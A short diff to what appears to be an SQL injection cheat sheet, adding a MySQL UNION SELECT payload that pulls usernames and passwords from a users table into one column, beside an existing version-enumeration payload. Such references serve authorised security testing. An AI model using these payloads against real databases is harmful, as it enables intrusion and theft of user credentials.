@@ -83,6 +83,7 @@ Version Enumeration
 MySQL
 
 ' UNION SELECT version(), NULL--
+' UNION SELECT NULL,username||'='||password from users-- (concats 2 values into 1 column)
 
 
 MSSQL
